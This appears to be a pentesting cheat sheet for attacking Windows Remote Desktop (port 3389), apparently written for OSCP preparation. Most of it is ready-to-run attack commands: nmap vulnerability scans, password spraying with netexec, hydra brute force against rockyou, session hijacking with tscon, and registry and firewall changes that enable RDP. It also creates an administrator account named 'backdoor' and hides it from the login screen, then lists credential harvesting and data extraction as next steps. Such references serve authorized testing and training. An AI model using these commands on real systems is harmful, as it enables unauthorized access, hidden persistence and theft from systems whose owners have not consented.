# RDP Enumeration (3389)

## Run nmap RDP scripts
```bash
nmap --script=rdp-* -p 3389 $IP
```

## Check for RDP encryption
```bash
nmap --script rdp-enum-encryption -p 3389 $IP
```

## Test for BlueKeep vulnerability
```bash
nmap --script rdp-vuln-ms12-020 -p 3389 $IP
```

## xfreerdp
```bash
# Add /d:domain.local for domain auth
xfreerdp3 /v:$IP /u:administrator /p:password /cert:ignore +dynamic-resolution
```

## Password spray with netexec
```bash
netexec rdp $IP -u users.txt -p 'Password123!' --continue-on-success
```

## Brute force RDP with hydra
```bash
hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt -t 1 -V $IP rdp
```

## Enable RDP via registry
```bash
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

## Add firewall exception for RDP
```bash
netsh advfirewall firewall add rule name="Remote Desktop" dir=in action=allow protocol=TCP localport=3389
```

---

# RDP Enumeration Methodology

## Initial Reconnaissance

1. Identify RDP service on port 3389
2. Check for vulnerabilities (BlueKeep, MS12-020)
3. Test for anonymous/guest access
4. Try default credentials
5. Attempt password spraying
6. If access gained, enumerate system
7. Look for privilege escalation opportunities

## Service Detection

**Version and security assessment:**
```bash
nmap -sV -p 3389 $IP
nmap --script rdp-enum-encryption -p 3389 $IP
```

**What to look for:**
- NLA (Network Level Authentication) status
- Encryption level
- RDP version
- Certificate information

## Authentication Testing

**Test guest access:**
```bash
xfreerdp /v:$IP /u:guest /p:"" /cert:ignore
```

**Test with null session:**
```bash
xfreerdp /v:$IP /u:"" /p:"" /cert:ignore
```

**Common default credentials:**
- administrator:password
- administrator:admin
- administrator: (blank)
- admin:admin
- user:user

## Network Level Authentication (NLA)

**NLA Enabled:**
- Requires valid credentials before connection
- More secure
- Prevents some enumeration

**NLA Disabled:**
- Allows connection attempts without valid creds
- Can test credentials without account lockout
- Less secure

**Check NLA status:**
nmap rdp-enum-encryption script will indicate if NLA is required.

## Password Spraying

**Best practices:**
- Use one password against many users
- Common passwords: Password123!, Welcome123!, Summer2024!
- Monitor for account lockouts
- Use -t 1 with hydra to limit connection attempts

**Tools:**
- netexec: Supports continue-on-success
- hydra: Standard brute force tool
- crowbar: RDP-specific tool

## Connection Methods

**xfreerdp (recommended):**
Most feature-rich and reliable RDP client for pentesting.

**Common options:**
- /v: Specify server
- /u: Username
- /p: Password
- /d: Domain
- /cert:ignore: Ignore certificate errors
- /size:WIDTHxHEIGHT: Window size
- /f: Full screen
- +clipboard: Enable clipboard sharing
- /drive:name,path: Share local directory

**rdesktop (alternative):**
Older but still functional:
```bash
rdesktop -g 1024x768 -u username -p password $IP
```

## Certificate Analysis

**Extract RDP certificate:**
```bash
nmap --script ssl-cert -p 3389 $IP
```

**Check with openssl:**
```bash
openssl s_client -connect $IP:3389 -starttls rdp 2>/dev/null | openssl x509 -noout -text
```

**Look for:**
- Expired certificates
- Self-signed certificates
- Hostname mismatches
- Weak encryption

## RDP Vulnerabilities

**BlueKeep (CVE-2019-0708):**
Critical RCE vulnerability in older Windows versions.

**Affected systems:**
- Windows 7
- Windows Server 2008 R2
- Windows Server 2008
- Windows XP
- Windows Server 2003

**Testing:**
```bash
nmap --script rdp-vuln-ms12-020 -p 3389 $IP
```

**Note:** Only DoS exploits should be used in OSCP, not RCE exploits that crash systems.

**MS12-020 (CVE-2012-0002):**
Denial of service vulnerability. Avoid using in production/exam environments.

## Advanced Connection Options

**Drive redirection:**
```bash
xfreerdp /v:$IP /u:username /p:password /cert:ignore /drive:share,/tmp
```

Files accessible at `\\tsclient\share\` on Windows target.

**Clipboard sharing:**
```bash
xfreerdp /v:$IP /u:username /p:password /cert:ignore +clipboard
```

Copy/paste between systems.

**Printer redirection:**
```bash
xfreerdp /v:$IP /u:username /p:password /cert:ignore +printer
```

**Full screen mode:**
```bash
xfreerdp /v:$IP /u:username /p:password /cert:ignore /f
```

Exit with Ctrl+Alt+Enter.

## File Transfer via RDP

**Method 1: Drive redirection**
```bash
xfreerdp /v:$IP /u:username /p:password /cert:ignore /drive:share,/tmp
```

On target:
```cmd
copy \\tsclient\share\file.exe C:\temp\
```

**Method 2: Clipboard**
```bash
xfreerdp /v:$IP /u:username /p:password /cert:ignore +clipboard
```

Base64 encode files, copy via clipboard, decode on target.

## Session Hijacking

**Enumerate sessions (requires admin):**
```cmd
query session
qwinsta
```

**Get detailed session info:**
```cmd
query user
```

**Hijack session (requires SYSTEM privileges):**
```cmd
tscon <session_id> /dest:<target_session>
```

**Example:**
```cmd
tscon 2 /dest:console
```

## Persistence via RDP

**Enable RDP if disabled:**
```cmd
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

**Add firewall exception:**
```cmd
netsh advfirewall firewall add rule name="Remote Desktop" dir=in action=allow protocol=TCP localport=3389
```

**Create backdoor user:**
```cmd
net user backdoor Password123! /add
net localgroup "Remote Desktop Users" backdoor /add
net localgroup administrators backdoor /add
```

**Hide user from login screen:**
```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v backdoor /t REG_DWORD /d 0 /f
```

## RDP Tunneling

**SSH tunnel for RDP:**
```bash
ssh -L 3389:192.168.1.20:3389 user@$IP
```

Then connect to localhost:
```bash
xfreerdp /v:localhost:3389 /u:username /p:password /cert:ignore
```

## Port Forwarding via RDP

**Once connected, forward ports:**
```cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=internal_ip
```

## Enumeration Checklist

- [ ] Service discovery and version identification
- [ ] Vulnerability scanning (BlueKeep, MS12-020)
- [ ] Anonymous/guest access testing
- [ ] Default credentials testing
- [ ] Password spraying (careful with lockouts)
- [ ] Certificate analysis
- [ ] Encryption assessment
- [ ] Session enumeration (if access gained)
- [ ] Privilege escalation opportunities

## Common Misconfigurations

1. **Default credentials** (administrator with weak passwords)
2. **Guest account enabled** with RDP access
3. **No Network Level Authentication** (NLA disabled)
4. **Weak encryption** settings
5. **Overly permissive Remote Desktop Users group**
6. **RDP enabled on internal systems** without access controls
7. **Outdated systems** vulnerable to BlueKeep
8. **Saved credentials** in RDP files

## Common RDP Ports

- 3389/tcp: RDP default
- 3390/tcp: RDP alternate (sometimes used)

## Next Steps

Once RDP access is gained:
1. Enumerate local system for privilege escalation
2. Harvest credentials from memory/registry
3. Enable persistence mechanisms
4. Pivot to internal network resources
5. Extract sensitive data via GUI access
6. Check for saved RDP connections with credentials

---

# References

- https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp
- https://docs.microsoft.com/en-us/windows-server/remote/remote-desktop-services/rds-security-guidance
- https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0708 (BlueKeep)
